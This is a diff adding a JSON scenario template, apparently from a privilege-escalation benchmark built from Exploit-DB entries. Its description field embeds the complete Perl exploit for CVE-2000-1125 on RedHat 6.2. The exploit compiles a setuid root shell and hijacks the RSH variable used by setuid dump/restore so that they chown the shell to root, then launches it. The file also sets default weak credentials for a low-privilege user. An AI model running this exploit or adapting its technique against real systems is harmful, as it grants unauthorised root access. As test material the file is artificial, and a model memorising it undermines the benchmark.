@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_184",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: RedHat 6.2 Restore and Dump - Local Privilege Escalation (OSVDB-13758;CVE-2000-1125)\n\nExploit source code (184.pl):\n```\n#!/usr/bin/perl\n\n# perl exploit of restore and dump\n# redhat linux 6.2\n# written by tlabs\n# Use at your discretion\n\n$EXPORT1=\"TAPE=garbage:garbage\" ;\n$EXPORT2=\"RSH=./hey\" ;\n\nsub USAGE\n{\n  print \"$0 <type>\\n1=dump 2=dump.static 3=restore 4=restore.staic\\nYour choice innit;)\\nWritten by Tlabs\\n\" ;\n  exit 0 ;\n}\n\nsub ERROR\n{\n  print \"$_[0]\\n\" ;\n  exit 0 ;\n}\n\nopen(TEMP, \">shell.c\")|| ERROR(\"Something went wrong:$!\");\nprintf TEMP \"#include<unistd.h>\\n#include<stdlib.h>\\nint main()\\n{\" ;\nprintf TEMP \"    setuid(0);\\n\\tsetgid(0);\\n\\texecl(\\\"/bin/sh\\\",\\\"sh\\\",0);\\n\\treturn 0;\\n}\" ;\nclose(TEMP);\nsystem \"cc -o shell shell.c\" ;\nunlink \"shell.c\" ;\nopen(TEMP1, \">hey\")|| ERROR(\"Something went wrong: $!\");\nprintf TEMP1 \"#!/bin/sh\\nchown root shell\\nchmod 4755 shell\" ;\nclose(TEMP1);\nchmod(0755, \"hey\");\n\nif ($ARGV[$0] eq \"1\")\n{\n  $DUMPER=\"/sbin/dump\" ;\n  if ( -u \"$DUMPER\" )\n  {\n    system \"export $EXPORT1 ;export $EXPORT2 ; $DUMPER -0 \\/\" ;\n    sleep(3);\n    if ( -u \"shell\" )\n    {\n      unlink \"hey\" ;\n      system \"./shell\" ;\n    }\n    else\n    {\n      unlink \"hey\" ;\n      unlink \"shell\" ;\n      print \"Something fucked at the last, sorry\" ;\n    }\n   }\n   else\n   {\n     unlink \"hey\" ;\n     unlink \"shell\" ;\n     printf \"Dump is not exploitable on this system\\n\";\n   }\n}\nelsif ($ARGV[$0] eq \"2\")\n{\n  $DUMPER=\"/sbin/dump.static\" ;\n  if ( -u \"$DUMPER\" )\n  {\n    system \"export $EXPORT1 ;export $EXPORT2 ; $DUMPER -0 \\/\" ;\n    sleep(3);\n    if ( -u \"shell\" )\n    {\n      unlink \"hey\" ;\n      system \"./shell\" ;\n    }\n    else\n    {\n      unlink \"hey\" ;\n      unlink \"shell\" ;\n      print \"Something fucked at the last, sorry\" ;\n    }\n  }\n  else\n  {\n    unlink \"hey\" ;\n    unlink \"shell\" ;\n    printf \"Dump.static is not exploitable on this system\\n\";\n  }\n}\nelsif ($ARGV[$0] eq \"3\")\n{\n  $RESTORER=\"/sbin/restore\" ;\n  if ( -u \"$RESTORER\" )\n  {\n    system \"export $EXPORT1 ; export $EXPORT2 ; $RESTORER -i\" ;\n    sleep(3);\n    if ( -u \"shell\" )\n    {\n      unlink \"hey\" ;\n      system \"./shell\" ;\n    }\n    else\n    {\n      unlink \"hey\" ;\n      unlink \"shell\" ;\n      print \"Something fucked at the last, sorry\" ;\n    }\n  }\n  else\n  {\n    unlink \"hey\" ;\n    unlink \"shell\" ;\n    printf \"Restore is not exploitable on this system\\n\";\n  }\n}\nelsif ($ARGV[$0] eq \"4\")\n{\n  $RESTORER=\"/sbin/restore.static\" ;\n  if ( -u \"$RESTORER\" )\n  {\n    system \"export $EXPORT1 ; export $EXPORT2 ; $RESTORER -i\" ;\n    sleep(3);\n    if ( -u \"shell\" )\n    {\n      unlink \"hey\" ;\n      system \"./shell\" ;\n    }\n    else\n    {\n      unlink \"hey\" ;\n      unlink \"shell\" ;\n      print \"Something fucked at the last, sorry\" ;\n    }\n  }\n  else\n  {\n    unlink \"hey\" ;\n    unlink \"shell\" ;\n    printf \"Restore.static is not exploitable on this system\\n\";\n  }\n}\nelse\n{\n  USAGE ;\n}\n\n\n# milw0rm.com [2000-11-16]\n```",
+  "cve": "OSVDB-13758;CVE-2000-1125",
+  "exploitdb_id": "184",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_184",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
